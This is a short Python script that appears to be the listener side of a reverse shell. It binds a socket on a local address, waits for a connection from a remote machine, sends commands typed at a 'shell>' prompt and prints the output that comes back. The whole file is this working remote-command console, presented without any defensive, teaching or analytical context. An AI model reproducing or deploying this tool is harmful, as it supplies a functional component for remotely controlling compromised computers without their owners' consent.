import socket
def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("192.168.1.9", 1208))
    s.listen(1)
    print('[X] Listening')
    # Setting up
    conn,addr=s.accept()
    while True:
        cmd = bytes(input('shell>'), "utf-8")
        if 'terminate' in cmd.decode():
            conn.send(b'terminate')
            conn.close()
            break
        else:
            conn.send(cmd)
            print(conn.recv(1024))
if __name__ == "__main__":
    main()